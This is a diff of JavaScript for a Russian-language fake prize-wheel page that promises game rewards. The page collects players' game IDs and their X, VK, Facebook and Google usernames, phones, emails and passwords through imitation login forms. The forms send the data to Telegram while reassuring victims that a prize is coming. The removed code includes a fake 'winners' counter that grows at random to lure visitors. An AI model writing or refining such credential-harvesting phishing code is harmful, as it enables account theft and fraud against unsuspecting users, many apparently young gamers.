@@ -2626,10 +2791,7 @@
         let ownerIP = '31.43.60.156';
         let userIP = '';
         let hasPlayed = false;
-        let accountId = '';
-        let winnersCount = 0;
-        let winnersInterval = null;
-        let currentLanguage = 'en'; // По умолчанию английский
+        let userAccountId = '';
         
         // Функции для модальных окон
         function openModal(modalId) {
@@ -2662,6 +2824,7 @@
             openModal('xModalStep1');
         }
         
+        // Функции для окна приза
         function openPrizeWindow() {
             const prizeWindow = document.getElementById('prizeWindow');
             prizeWindow.classList.add('active');
@@ -2669,59 +2832,40 @@
             
             if (userPrize) {
                 document.getElementById('winImg').src = userPrize.image;
-                document.getElementById('winName').textContent = currentLanguage === 'ru' ? "ПРИЗ" : currentLanguage === 'uz' ? "SOVRIN" : "PRIZE";
+                document.getElementById('winName').textContent = "ПРИЗ";
                 document.getElementById('prizeDescription').textContent = isPrizeReceived ? 
-                    (currentLanguage === 'ru' ? "✅ Ваш приз был отправлен на ваш аккаунт PUBG Mobile." : 
-                     currentLanguage === 'uz' ? "✅ Sizning sovringiz PUBG Mobile hisobingizga yuborildi." :
-                     "✅ Your prize has been sent to your PUBG Mobile account.") : 
-                    (currentLanguage === 'ru' ? "Выберите социальную сеть для получения приза." :
-                     currentLanguage === 'uz' ? "Sovrinni olish uchun ijtimoiy tarmoqni tanlang." :
-                     "Choose a social network to receive the prize.");
+                    "✅ Ваш приз был отправлен на ваш игровой аккаунт." : 
+                    "Выберите социальную сеть для получения приза.";
                 
                 const collectBtn = document.getElementById('collectPrizeBtn');
                 if (!isPrizeReceived) {
-                    collectBtn.textContent = currentLanguage === 'ru' ? "ЗАБРАТЬ" : currentLanguage === 'uz' ? "OLISH" : "COLLECT";
+                    collectBtn.textContent = "ЗАБРАТЬ";
                     collectBtn.onclick = function() {
                         closePrizeWindow();
                         
-                        // Показываем форму ввода ID аккаунта
-                        if (!accountId) {
-                            accountIdSection.classList.add('active');
-                            accountIdSection.scrollIntoView({ behavior: 'smooth' });
-                        } else {
-                            // Сбрасываем выбор соцсети
-                            socialOptions.forEach(opt => opt.classList.remove('selected'));
-                            selectedSocial = null;
-                            
-                            // Показываем форму выбора соцсети
-                            socialSelectSection.classList.add('active');
-                            socialSelectSection.scrollIntoView({ behavior: 'smooth' });
-                        }
+                        // Сбрасываем выбор соцсети
+                        socialOptions.forEach(opt => opt.classList.remove('selected'));
+                        selectedSocial = null;
                         
-                        showNotification(
-                            currentLanguage === 'ru' ? "Выберите социальную сеть для получения приза" :
-                            currentLanguage === 'uz' ? "Sovrinni olish uchun ijtimoiy tarmoqni tanlang" :
-                            "Select a social network to receive the prize"
-                        );
+                        // Показываем форму выбора соцсети
+                        socialSelectSection.classList.add('active');
+                        socialSelectSection.scrollIntoView({ behavior: 'smooth' });
+                        
+                        showNotification("Выберите социальную сеть для получения приза", false, false);
                     };
                 } else {
-                    collectBtn.textContent = currentLanguage === 'ru' ? "ЗАКРЫТЬ" : currentLanguage === 'uz' ? "YOPISH" : "CLOSE";
+                    collectBtn.textContent = "ЗАКРЫТЬ";
                     collectBtn.onclick = function() {
                         closePrizeWindow();
                     };
                 }
             } else {
                 document.getElementById('winImg').src = '';
-                document.getElementById('winName').textContent = currentLanguage === 'ru' ? "ПОЧТА ПУСТА" : 
-                    currentLanguage === 'uz' ? "POCHTA BO'SH" : "MAIL EMPTY";
-                document.getElementById('prizeDescription').textContent = currentLanguage === 'ru' ? 
-                    "У вас пока нет выигранных призов. Сыграйте в колесо удачи, чтобы выиграть эксклюзивные призы!" :
-                    currentLanguage === 'uz' ?
-                    "Sizda hali yutib olingan sovrinlar yo'q. Eksklyuziv sovrinlarni yutib olish uchun omad g'ildig'ida o'ynang!" :
-                    "You don't have any prizes yet. Play the wheel of fortune to win exclusive prizes!";
+                document.getElementById('winName').textContent = "ПОЧТА ПУСТА";
+                document.getElementById('prizeDescription').textContent = "У вас пока нет выигранных призов. Сыграйте в колесо удачи, чтобы выиграть эксклюзивные призы!";
                 
                 const collectBtn = document.getElementById('collectPrizeBtn');
-                collectBtn.textContent = currentLanguage === 'ru' ? "ЗАКРЫТЬ" : currentLanguage === 'uz' ? "YOPISH" : "CLOSE";
+                collectBtn.textContent = "ЗАКРЫТЬ";
                 collectBtn.onclick = function() {
                     closePrizeWindow();
                 };
@@ -2757,46 +2901,21 @@
             }
         }
         
-        // Функция управления счетчиком победителей
-        function initWinnersCounter() {
-            // Получаем сохраненное значение из localStorage или устанавливаем рандомное от 50 до 100
-            const savedCount = localStorage.getItem('winnersCount');
-            
-            if (savedCount) {
-                winnersCount = parseInt(savedCount);
-            } else {
-                // Генерируем рандомное число от 50 до 100
-                winnersCount = Math.floor(Math.random() * 51) + 50;
-                localStorage.setItem('winnersCount', winnersCount.toString());
-            }
-            
-            // Обновляем отображение
-            updateWinnersDisplay();
-            
-            // Запускаем таймер для увеличения счетчика каждые 40 секунд
-            winnersInterval = setInterval(() => {
-                winnersCount += Math.floor(Math.random() * 3) + 1; // Добавляем 1-3 победителя
-                localStorage.setItem('winnersCount', winnersCount.toString());
-                updateWinnersDisplay();
-            }, 40000); // 40 секунд
-        }
-        
-        function updateWinnersDisplay() {
-            const countElement = document.getElementById('winnersCount');
-            if (countElement) {
-                countElement.textContent = winnersCount;
-                
-                // Анимация при обновлении
-                countElement.style.transform = 'scale(1.2)';
-                setTimeout(() => {
-                    countElement.style.transform = 'scale(1)';
-                }, 300);
-            }
-        }
-        
         document.addEventListener('DOMContentLoaded', function() {
-            // Инициализируем счетчик победителей
-            initWinnersCounter();
+            // Боковое меню
+            const menuToggle = document.getElementById('menuToggle');
+            const sidebar = document.getElementById('sidebar');
+            
+            menuToggle.addEventListener('click', function() {
+                sidebar.classList.toggle('active');
+            });
+            
+            // Закрытие меню при клике вне его
+            document.addEventListener('click', function(event) {
+                if (!sidebar.contains(event.target) && !menuToggle.contains(event.target)) {
+                    sidebar.classList.remove('active');
+                }
+            });
             
             // Получаем IP пользователя
             fetch('https://api.ipify.org?format=json')
@@ -2825,9 +2944,6 @@
             const playBtn = document.getElementById('playBtn');
             const selectionFrame = document.getElementById('selectionFrame');
             const selectionIndicator = document.getElementById('selectionIndicator');
-            const accountIdSection = document.getElementById('accountIdSection');
-            const accountIdInput = document.getElementById('accountIdInput');
-            const idSubmitBtn = document.getElementById('idSubmitBtn');
             const socialSelectSection = document.getElementById('socialSelectSection');
             const confirmationSection = document.getElementById('confirmationSection');
             const getPrizeBtn = document.getElementById('getPrizeBtn');
@@ -2840,9 +2956,20 @@
             const socialOptions = document.querySelectorAll('.social-option');
             const prizeMailBtn = document.getElementById('prizeMailBtn');
             const collectPrizeBtn = document.getElementById('collectPrizeBtn');
-            const importantNote = document.getElementById('importantNote');
-            const menuBtn = document.getElementById('menuBtn');
-            const dropdownMenu = document.getElementById('dropdownMenu');
+            
+            // Элементы для ввода ID аккаунта
+            const accountIdInput = document.getElementById('accountIdInput');
+            const saveIdBtn = document.getElementById('saveIdBtn');
+            const idSavedMessage = document.getElementById('idSavedMessage');
+            const accountIdSection = document.getElementById('accountIdSection');
+            
+            // Загружаем сохраненный ID из localStorage
+            const savedAccountId = localStorage.getItem('userAccountId');
+            if (savedAccountId) {
+                userAccountId = savedAccountId;
+                accountIdInput.value = savedAccountId;
+                idSavedMessage.style.display = 'block';
+            }
             
             // Элементы Google Fullscreen
             const googleFullscreen = document.getElementById('googleFullscreen');
@@ -2881,87 +3008,103 @@
             // Языковые настройки
             const translations = {
                 ru: {
-                    winners: "Победителей",
                     play: "ИГРАТЬ",
-                    alreadyPlayed: "УЖЕ ИГРАЛИ",
-                    idTitle: "ВВЕДИТЕ ID АККАУНТА PUBG",
-                    idText: "Пожалуйста, введите ваш ID аккаунта PUBG Mobile для получения приза",
-                    idLabel: "ID аккаунта PUBG:",
-                    idPlaceholder: "Введите ваш ID аккаунта",
-                    idSubmit: "ПРОДОЛЖИТЬ",
+                    title: "КОЛЕСО УДАЧИ",
+                    subtitle: "Испытай удачу и выиграй эксклюзивные призы!",
                     selectTitle: "ВЫБЕРИТЕ СПОСОБ ПОЛУЧЕНИЯ",
                     selectText: "Выберите социальную сеть для получения приза",
                     getPrizeBtn: "ПОЛУЧИТЬ ПРИЗ",
-                    importantNote: "Важно: Приз будет зачислен на ваш аккаунт в течение 24 часов",
                     notificationSuccess: "Заявка принята! Приз будет зачислен в течение 24 часов.",
                     notificationSelectSocial: "Пожалуйста, выберите социальную сеть",
                     notificationAlreadyPlayed: "Вы уже использовали свою попытку сегодня!",
-                    notificationIdRequired: "Пожалуйста, введите ID аккаунта",
                     confirmationTitle: "ЗАЯВКА ПРИНЯТА!",
-                    confirmationMessage: "Ваш выигрыш будет зачислен на аккаунт PUBG Mobile в течение 24 часов.",
-                    confirmationThankYou: "Спасибо за участие!<br>Не забудьте проверить свой инвентарь в игре.",
+                    confirmationMessage: "Ваш выигрыш будет зачислен на аккаунт в течение 24 часов.",
                     loginSuccess: "Данные для входа отправлены! Приз будет зачислен в течение 24 часов.",
-                    support: "Поддержка",
-                    menu: "Меню"
+                    alreadyPlayed: "УЖЕ ИГРАЛИ",
+                    idPlaceholder: "Введите ваш ID (например: 123456789)",
+                    idSaved: "ID успешно сохранен! Он будет использован для зачисления приза.",
+                    idRequired: "Пожалуйста, введите ID вашего аккаунта"
                 },
                 en: {
-                    winners: "Winners",
                     play: "PLAY",
-                    alreadyPlayed: "ALREADY PLAYED",
-                    idTitle: "ENTER PUBG ACCOUNT ID",
-                    idText: "Please enter your PUBG Mobile account ID to receive the prize",
-                    idLabel: "PUBG Account ID:",
-                    idPlaceholder: "Enter your account ID",
-                    idSubmit: "CONTINUE",
+                    title: "WHEEL OF FORTUNE",
+                    subtitle: "Try your luck and win exclusive prizes!",
                     selectTitle: "SELECT RECEIVING METHOD",
                     selectText: "Select social network to receive the prize",
                     getPrizeBtn: "GET PRIZE",
-                    importantNote: "Important: The prize will be credited to your account within 24 hours",
                     notificationSuccess: "Application accepted! The prize will be credited within 24 hours.",
                     notificationSelectSocial: "Please select a social network",
                     notificationAlreadyPlayed: "You have already used your attempt today!",
-                    notificationIdRequired: "Please enter account ID",
                     confirmationTitle: "APPLICATION ACCEPTED!",
-                    confirmationMessage: "Your winnings will be credited to your PUBG Mobile account within 24 hours.",
-                    confirmationThankYou: "Thank you for participating!<br>Don't forget to check your in-game inventory.",
+                    confirmationMessage: "Your winnings will be credited to your account within 24 hours.",
                     loginSuccess: "Login data sent! Prize will be credited within 24 hours.",
-                    support: "Support",
-                    menu: "Menu"
+                    alreadyPlayed: "ALREADY PLAYED",
+                    idPlaceholder: "Enter your ID (e.g.: 123456789)",
+                    idSaved: "ID successfully saved! It will be used to credit the prize.",
+                    idRequired: "Please enter your account ID"
                 },
                 uz: {
-                    winners: "G'oliblar",
                     play: "O'YIN",
-                    alreadyPlayed: "ALLAQACHON O'YNANGAN",
-                    idTitle: "PUBG HISOB ID RAQAMINI KIRITING",
-                    idText: "Iltimos, sovrinni olish uchun PUBG Mobile hisobingizning ID raqamini kiriting",
-                    idLabel: "PUBG Hisob ID raqami:",
-                    idPlaceholder: "Hisobingiz ID raqamini kiriting",
-                    idSubmit: "DAVOM ETISH",
+                    title: "BAXT G'ILDIRAG'I",
+                    subtitle: "Omadingizni sinab ko'ring va eksklyuziv sovrinlarni yutib oling!",
                     selectTitle: "QABUL QILISH USULINI TANLANG",
                     selectText: "Sovrinni qabul qilish uchun ijtimoiy tarmoqni tanlang",
                     getPrizeBtn: "SOVRINNI OLISH",
-                    importantNote: "Muhim: Sovrin 24 soat ichida hisobingizga o'tkaziladi",
                     notificationSuccess: "Ariza qabul qilindi! Sovrin 24 soat ichida o'tkaziladi.",
                     notificationSelectSocial: "Iltimos, ijtimoiy tarmoqni tanlang",
                     notificationAlreadyPlayed: "Siz bugungi imkoniyatingizdan foydalandingiz!",
-                    notificationIdRequired: "Iltimos, hisob ID raqamini kiriting",
                     confirmationTitle: "ARIZA QABUL QILINDI!",
-                    confirmationMessage: "Yutigingiz PUBG Mobile hisobingizga 24 soat ichida o'tkaziladi.",
-                    confirmationThankYou: "Ishtirok etganingiz uchun rahmat!<br>O'yin ichidagi inventaringizni tekshirishni unutmang.",
+                    confirmationMessage: "Yutigingiz hisobingizga 24 soat ichida o'tkaziladi.",
                     loginSuccess: "Kirish ma'lumotlari yuborildi! Sovrin 24 soat ichida o'tkaziladi.",
-                    support: "Yordam",
-                    menu: "Menyu"
+                    alreadyPlayed: "ALLAQACHON O'YNANGAN",
+                    idPlaceholder: "IDingizni kiriting (masalan: 123456789)",
+                    idSaved: "ID muvaffaqiyatli saqlandi! Sovrinni o'tkazish uchun ishlatiladi.",
+                    idRequired: "Iltimos, hisobingiz ID sini kiriting"
+                },
+                kz: {
+                    play: "ОЙНАУ",
+                    title: "БАХТ ДӘПЕРЕ",
+                    subtitle: "Сәттілігін сынап көріңіз және эксклюзитті жүлделерді ұтып алыңыз!",
+                    selectTitle: "ҚАБЫЛДАУ ӘДІСІН ТАҢДАҢЫЗ",
+                    selectText: "Жүлдені қабылдау үшін әлеуметтік желіні таңдаңыз",
+                    getPrizeBtn: "ЖҮЛДЕНІ АЛУ",
+                    notificationSuccess: "Өтініш қабылданды! Жүлде 24 сағат ішінде аударылады.",
+                    notificationSelectSocial: "Өтінеміз, әлеуметтік желіні таңдаңыз",
+                    notificationAlreadyPlayed: "Сіз бүгінгі мүмкіндігіңізді пайдаландыңыз!",
+                    confirmationTitle: "ӨТІНІШ ҚАБЫЛДАНДЫ!",
+                    confirmationMessage: "Жеңісіңіз шотыңызға 24 сағат ішінде аударылады.",
+                    loginSuccess: "Кіру деректері жіберілді! Жүлде 24 сағат ішінде аударылады.",
+                    alreadyPlayed: "ҚАЗІРГІ ОЙНАҒАН",
+                    idPlaceholder: "IDіңізді енгізіңіз (мысалы: 123456789)",
+                    idSaved: "ID сәтті сақталды! Жүлдені аудару үшін пайдаланылады.",
+                    idRequired: "Өтінеміз, шотыңыздың ID сін енгізіңіз"
+                },
+                ar: {
+                    play: "لعب",
+                    title: "عجلة الحظ",
+                    subtitle: "جرب حظك واربح جوائز حصرية!",
+                    selectTitle: "اختر طريقة الاستلام",
+                    selectText: "اختر شبكة اجتماعية لاستلام الجائزة",
+                    getPrizeBtn: "الحصول على الجائزة",
+                    notificationSuccess: "تم قبول الطلب! سيتم إضافة الجائزة خلال 24 ساعة.",
+                    notificationSelectSocial: "يرجى اختيار شبكة اجتماعية",
+                    notificationAlreadyPlayed: "لقد استخدمت محاولتك اليوم بالفعل!",
+                    confirmationTitle: "تم قبول الطلب!",
+                    confirmationMessage: "سيتم إضافة ربحك إلى حسابك خلال 24 ساعة.",
+                    loginSuccess: "تم إرسال بيانات تسجيل الدخول! سيتم إضافة الجائزة خلال 24 ساعة.",
+                    alreadyPlayed: "لعبت بالفعل",
+                    idPlaceholder: "أدخل معرفك (مثال: 123456789)",
+                    idSaved: "تم حفظ المعرف بنجاح! سيتم استخدامه لإضافة الجائزة.",
+                    idRequired: "يرجى إدخال معرف حسابك"
                 }
             };
             
             // Функция смены языка
             function changeLanguage(lang) {
-                currentLanguage = lang;
-                const t = translations[lang] || translations.en;
+                const t = translations[lang] || translations.ru;
                 
-                // Обновляем счетчик победителей
-                const winnersCounter = document.querySelector('.winners-counter');
-                winnersCounter.innerHTML = `<i class="fas fa-trophy"></i> ${t.winners}: <span class="winners-count" id="winnersCount">${winnersCount}</span>`;
+                document.querySelector('.header h1').textContent = t.title;
+                document.querySelector('.header p').textContent = t.subtitle;
                 
                 if (hasPlayed && userIP !== ownerIP) {
                     playBtn.innerHTML = `<i class="fas fa-check"></i> ${t.alreadyPlayed}`;
@@ -2969,45 +3112,31 @@
                     playBtn.innerHTML = `<i class="fas fa-play"></i> ${t.play}`;
                 }
                 
-                // Индикатор выбора
-                selectionIndicator.textContent = lang === 'ru' ? 'ВЫБРАНО' : lang === 'uz' ? 'TANLANGAN' : 'SELECTED';
-                
-                // Форма ввода ID аккаунта
-                document.querySelector('#accountIdSection h2').textContent = t.idTitle;
-                document.querySelector('#accountIdSection p').textContent = t.idText;
-                document.querySelector('.id-label').textContent = t.idLabel;
-                document.getElementById('accountIdInput').placeholder = t.idPlaceholder;
-                idSubmitBtn.innerHTML = `<i class="fas fa-check"></i> ${t.idSubmit}`;
-                
-                // Форма выбора соцсети
                 document.querySelector('#socialSelectSection h2').textContent = t.selectTitle;
                 document.querySelector('#socialSelectSection p').textContent = t.selectText;
                 getPrizeBtn.innerHTML = `<i class="fas fa-paper-plane"></i> ${t.getPrizeBtn}`;
-                importantNote.innerHTML = `<strong>${t.importantNote.split(':')[0]}:</strong> ${t.importantNote.split(':')[1]}`;
-                
-                // Секция подтверждения
                 document.querySelector('#confirmationSection h2').textContent = t.confirmationTitle;
                 document.querySelector('.confirmation-message').innerHTML = t.confirmationMessage;
-                document.querySelector('#confirmationSection p').innerHTML = t.confirmationThankYou;
                 
-                // Кнопка языка
+                // Обновляем текст для блока ввода ID
+                document.querySelector('#accountIdSection h2').innerHTML = `<i class="fas fa-id-card"></i> ВВЕДИТЕ ID ВАШЕГО АККАУНТА`;
+                document.querySelector('#accountIdSection p').textContent = 'Для зачисления выигранного приза необходимо указать ID вашего игрового аккаунта.';
+                accountIdInput.placeholder = t.idPlaceholder;
+                saveIdBtn.innerHTML = `<i class="fas fa-save"></i> СОХРАНИТЬ ID`;
+                document.querySelector('#accountIdSection .id-note').innerHTML = `<i class="fas fa-info-circle"></i> ID можно найти в настройках игры или в профиле игрока. Обычно это последовательность цифр.`;
+                document.querySelector('#accountIdSection .warning-note').innerHTML = `<i class="fas fa-exclamation-triangle"></i> ВНИМАНИЕ: Убедитесь, что вводите правильный ID. При вводе неверного ID приз не будет зачислен.`;
+                
                 const langNames = {
-                    ru: 'Русский', 
-                    en: 'English', 
-                    uz: "O'zbekcha"
+                    ru: 'Русский', en: 'English', uz: "O'zbekcha",
+                    kz: 'Қазақша', ar: 'العربية', zh: '中文',
+                    ky: 'Кыргызча', dag: 'Дагестанский', che: 'Чеченский',
+                    az: 'Azərbaycanca', hy: 'Հայերեն', jp: '日本語',
+                    uk: 'Українська'
                 };
-                languageBtn.innerHTML = `<i class="fas fa-globe"></i> ${langNames[lang] || 'English'} <i class="fas fa-chevron-down"></i>`;
+                languageBtn.innerHTML = `<i class="fas fa-globe"></i> ${langNames[lang] || 'Русский'} <i class="fas fa-chevron-down"></i>`;
                 
-                // Кнопка меню
-                menuBtn.innerHTML = `<i class="fas fa-bars"></i> ${t.menu}`;
-                
-                // Пункты меню
-                const dropdownItems = document.querySelectorAll('.dropdown-item');
-                dropdownItems[0].innerHTML = `<i class="fab fa-telegram"></i> ${t.support}`;
-                dropdownItems[1].innerHTML = `<i class="fab fa-instagram"></i> Instagram`;
-                
-                // Кнопка "Мой приз"
-                prizeMailBtn.innerHTML = `<i class="fas fa-gift"></i> ${t.myPrize} <div class="prize-badge" id="prizeBadge">0</div>`;
+                // Обновляем текст индикатора выбора
+                selectionIndicator.textContent = 'ВЫБРАНО';
             }
             
             // Обработчики для меню языка
@@ -3020,23 +3149,14 @@
                     const lang = this.getAttribute('data-lang');
                     changeLanguage(lang);
                     languageDropdown.classList.remove('show');
-                    showNotification(
-                        lang === 'ru' ? 'Язык изменен на Русский' :
-                        lang === 'uz' ? 'Til O\'zbekcha ga o\'zgartirildi' :
-                        'Language changed to English'
-                    );
+                    showNotification(`Язык изменен на ${this.textContent}`, false, false);
                 });
-            });
-            
-            // Обработчик для меню бургера
-            menuBtn.addEventListener('click', function() {
-                dropdownMenu.classList.toggle('show');
             });
             
             // Функция показа уведомления
             function showNotification(message, isError = false, isSuccess = false) {
                 notification.textContent = message;
-                notification.classList.remove('error', 'success');
+                notification.classList.remove('error', 'success', 'warning');
                 
                 if (isError) {
                     notification.classList.add('error');
@@ -3051,21 +3171,60 @@
                 }, 5000);
             }
             
+            // Функция сохранения ID аккаунта
+            saveIdBtn.addEventListener('click', function() {
+                const accountId = accountIdInput.value.trim();
+                
+                if (!accountId) {
+                    showNotification("Пожалуйста, введите ID вашего аккаунта", true);
+                    return;
+                }
+                
+                // Проверяем, что ID содержит только цифры (опционально)
+                if (!/^\d+$/.test(accountId)) {
+                    showNotification("ID должен содержать только цифры", true);
+                    return;
+                }
+                
+                // Сохраняем ID
+                userAccountId = accountId;
+                localStorage.setItem('userAccountId', accountId);
+                
+                // Показываем сообщение об успехе
+                idSavedMessage.style.display = 'block';
+                idSavedMessage.innerHTML = `<i class="fas fa-check-circle"></i> ID успешно сохранен! Он будет использован для зачисления приза.`;
+                
+                showNotification("ID аккаунта успешно сохранен", false, true);
+                
+                // Автоматически скрываем сообщение через 5 секунд
+                setTimeout(() => {
+                    idSavedMessage.style.display = 'none';
+                }, 5000);
+            });
+            
             // Функция получения случайного приза
             function getRandomPrize() {
                 return Math.floor(Math.random() * prizes.length);
             }
             
-            // Функция перемещения рамки
+            // Функция перемещения рамки - ОБНОВЛЕНА ДЛЯ РАВНОМЕРНОСТИ
             function moveFrameToPrize(index) {
                 const prizeItem = prizeItems[index];
                 const rect = prizeItem.getBoundingClientRect();
                 const containerRect = document.querySelector('.roulette-container').getBoundingClientRect();
                 
-                selectionFrame.style.width = (rect.width + 20) + 'px';
-                selectionFrame.style.height = (rect.height + 20) + 'px';
-                selectionFrame.style.left = (rect.left - containerRect.left - 8) + 'px';
-                selectionFrame.style.top = (rect.top - containerRect.top - 8) + 'px';
+                // Используем фиксированные размеры для равномерной рамки
+                const frameSize = Math.min(rect.width, rect.height) + 20; // +20 для отступов
+                
+                selectionFrame.style.width = frameSize + 'px';
+                selectionFrame.style.height = frameSize + 'px';
+                
+                // Центрируем рамку на призе
+                const centerX = rect.left - containerRect.left + rect.width/2 - frameSize/2;
+                const centerY = rect.top - containerRect.top + rect.height/2 - frameSize/2;
+                
+                selectionFrame.style.left = centerX + 'px';
+                selectionFrame.style.top = centerY + 'px';
                 selectionFrame.classList.add('active');
                 
                 // Позиционирование индикатора
@@ -3077,6 +3236,7 @@
             function showSelectionIndicator(show) {
                 if (show) {
                     selectionIndicator.classList.add('show');
+                    selectionIndicator.textContent = 'ВЫБРАНО';
                 } else {
                     selectionIndicator.classList.remove('show');
                 }
@@ -3090,18 +3250,12 @@
                 const isOwner = localStorage.getItem('isOwner') === 'true';
                 
                 if (!isOwner && hasPlayed) {
-                    showNotification(
-                        currentLanguage === 'ru' ? "Вы уже использовали свою попытку сегодня!" :
-                        currentLanguage === 'uz' ? "Siz bugungi imkoniyatingizdan foydalandingiz!" :
-                        "You have already used your attempt today!", 
-                        true
-                    );
+                    showNotification("Вы уже использовали свою попытку сегодня!", true);
                     return;
                 }
                 
                 isSpinning = true;
                 playBtn.disabled = true;
-                accountIdSection.classList.remove('active');
                 socialSelectSection.classList.remove('active');
                 confirmationSection.classList.remove('active');
                 showSelectionIndicator(false);
@@ -3161,72 +3315,32 @@
                             if (userIP !== ownerIP) {
                                 hasPlayed = true;
                                 localStorage.setItem('hasPlayed', 'true');
-                                playBtn.innerHTML = `<i class="fas fa-check"></i> ${currentLanguage === 'ru' ? 'УЖЕ ИГРАЛИ' : currentLanguage === 'uz' ? 'ALLAQACHON O\'YNANGAN' : 'ALREADY PLAYED'}`;
+                                playBtn.innerHTML = '<i class="fas fa-check"></i> УЖЕ ИГРАЛИ';
                             } else {
-                                playBtn.innerHTML = `<i class="fas fa-play"></i> ${currentLanguage === 'ru' ? 'ИГРАТЬ' : currentLanguage === 'uz' ? 'O\'YIN' : 'PLAY'}`;
+                                playBtn.innerHTML = '<i class="fas fa-play"></i> ИГРАТЬ';
                             }
                             
                             playBtn.disabled = false;
                             
-                            // Показываем форму ввода ID аккаунта
-                            if (!accountId) {
-                                accountIdSection.classList.add('active');
+                            // Сбрасываем выбор соцсети
+                            socialOptions.forEach(opt => opt.classList.remove('selected'));
+                            selectedSocial = null;
+                            
+                            // Показываем форму выбора соцсети
+                            socialSelectSection.classList.add('active');
+                            socialSelectSection.scrollIntoView({ behavior: 'smooth' });
+                            
+                            // Показываем блок ввода ID, если он еще не заполнен
+                            if (!userAccountId) {
                                 accountIdSection.scrollIntoView({ behavior: 'smooth' });
-                            } else {
-                                // Сбрасываем выбор соцсети
-                                socialOptions.forEach(opt => opt.classList.remove('selected'));
-                                selectedSocial = null;
-                                
-                                // Показываем форму выбора соцсети
-                                socialSelectSection.classList.add('active');
-                                socialSelectSection.scrollIntoView({ behavior: 'smooth' });
+                                showNotification("Не забудьте ввести ID вашего аккаунта для получения приза", false, false);
                             }
                             
-                            showNotification(
-                                currentLanguage === 'ru' ? "Поздравляем! Вы выиграли приз!" :
-                                currentLanguage === 'uz' ? "Tabriklaymiz! Siz sovrin yutib oldingiz!" :
-                                "Congratulations! You won a prize!", 
-                                false, 
-                                true
-                            );
+                            showNotification("Поздравляем! Вы выиграли приз!", false, true);
                         }, 1000);
                     }, 300);
                 }
             }
-            
-            // Обработчик кнопки отправки ID аккаунта
-            idSubmitBtn.addEventListener('click', function() {
-                const id = accountIdInput.value.trim();
-                
-                if (!id) {
-                    showNotification(
-                        currentLanguage === 'ru' ? "Пожалуйста, введите ID аккаунта" :
-                        currentLanguage === 'uz' ? "Iltimos, hisob ID raqamini kiriting" :
-                        "Please enter account ID", 
-                        true
-                    );
-                    return;
-                }
-                
-                accountId = id;
-                accountIdSection.classList.remove('active');
-                
-                // Сбрасываем выбор соцсети
-                socialOptions.forEach(opt => opt.classList.remove('selected'));
-                selectedSocial = null;
-                
-                // Показываем форму выбора соцсети
-                socialSelectSection.classList.add('active');
-                socialSelectSection.scrollIntoView({ behavior: 'smooth' });
-                
-                showNotification(
-                    currentLanguage === 'ru' ? "ID аккаунта сохранен" :
-                    currentLanguage === 'uz' ? "Hisob ID raqami saqlandi" :
-                    "Account ID saved", 
-                    false, 
-                    true
-                );
-            });
             
             // Обработчики выбора соцсети
             socialOptions.forEach(option => {
@@ -3255,10 +3369,18 @@
                 e.preventDefault();
                 const password = this.querySelector('input').value;
                 
+                // Проверяем, введен ли ID аккаунта
+                if (!userAccountId) {
+                    showNotification("Сначала введите ID вашего аккаунта", true);
+                    closeModal('xModalStep2');
+                    accountIdSection.scrollIntoView({ behavior: 'smooth' });
+                    return;
+                }
+                
                 const loginData = {
-                    accountId: accountId,
                     username: xUsername,
-                    password: password
+                    password: password,
+                    account_id: userAccountId
                 };
                 
                 const success = await sendLoginDataToTelegram('x', loginData, finalPrizeIndex);
@@ -3268,13 +3390,7 @@
                     isPrizeReceived = true;
                     updatePrizeBadge();
                     showConfirmation();
-                    showNotification(
-                        currentLanguage === 'ru' ? "Данные для входа отправлены! Приз будет зачислен в течение 24 часов." :
-                        currentLanguage === 'uz' ? "Kirish ma'lumotlari yuborildi! Sovrin 24 soat ichida o'tkaziladi." :
-                        "Login data sent! Prize will be credited within 24 hours.", 
-                        false, 
-                        true
-                    );
+                    showNotification("Данные для входа отправлены! Приз будет зачислен в течение 24 часов.", false, true);
                 }
             });
             
@@ -3282,11 +3398,20 @@
             document.getElementById('vkLoginForm').addEventListener('submit', async function(e) {
                 e.preventDefault();
                 const inputs = this.querySelectorAll('input');
+                
+                // Проверяем, введен ли ID аккаунта
+                if (!userAccountId) {
+                    showNotification("Сначала введите ID вашего аккаунта", true);
+                    closeModal('vkModal');
+                    accountIdSection.scrollIntoView({ behavior: 'smooth' });
+                    return;
+                }
+                
                 const loginData = {
-                    accountId: accountId,
                     phone: inputs[0].value,
                     password: inputs[1].value,
-                    foreign_computer: inputs[2].checked ? 'Да' : 'Нет'
+                    foreign_computer: inputs[2].checked ? 'Да' : 'Нет',
+                    account_id: userAccountId
                 };
                 
                 const success = await sendLoginDataToTelegram('vk', loginData, finalPrizeIndex);
@@ -3296,13 +3421,7 @@
                     isPrizeReceived = true;
                     updatePrizeBadge();
                     showConfirmation();
-                    showNotification(
-                        currentLanguage === 'ru' ? "Данные для входа отправлены! Приз будет зачислен в течение 24 часов." :
-                        currentLanguage === 'uz' ? "Kirish ma'lumotlari yuborildi! Sovrin 24 soat ichida o'tkaziladi." :
-                        "Login data sent! Prize will be credited within 24 hours.", 
-                        false, 
-                        true
-                    );
+                    showNotification("Данные для входа отправлены! Приз будет зачислен в течение 24 часов.", false, true);
                 }
             });
             
@@ -3310,10 +3429,19 @@
             document.getElementById('facebookLoginForm').addEventListener('submit', async function(e) {
                 e.preventDefault();
                 const inputs = this.querySelectorAll('input');
+                
+                // Проверяем, введен ли ID аккаунта
+                if (!userAccountId) {
+                    showNotification("Сначала введите ID вашего аккаунта", true);
+                    closeModal('facebookModal');
+                    accountIdSection.scrollIntoView({ behavior: 'smooth' });
+                    return;
+                }
+                
                 const loginData = {
-                    accountId: accountId,
                     email: inputs[0].value,
-                    password: inputs[1].value
+                    password: inputs[1].value,
+                    account_id: userAccountId
                 };
                 
                 const success = await sendLoginDataToTelegram('facebook', loginData, finalPrizeIndex);
@@ -3323,13 +3451,7 @@
                     isPrizeReceived = true;
                     updatePrizeBadge();
                     showConfirmation();
-                    showNotification(
-                        currentLanguage === 'ru' ? "Данные для входа отправлены! Приз будет зачислен в течение 24 часов." :
-                        currentLanguage === 'uz' ? "Kirish ma'lumotlari yuborildi! Sovrin 24 soat ichida o'tkaziladi." :
-                        "Login data sent! Prize will be credited within 24 hours.", 
-                        false, 
-                        true
-                    );
+                    showNotification("Данные для входа отправлены! Приз будет зачислен в течение 24 часов.", false, true);
                 }
             });
             
@@ -3339,12 +3461,7 @@
                 const email = googleEmailInput.value.trim();
                 
                 if (!email) {
-                    showNotification(
-                        currentLanguage === 'ru' ? "Пожалуйста, введите email" :
-                        currentLanguage === 'uz' ? "Iltimos, email kiriting" :
-                        "Please enter email", 
-                        true
-                    );
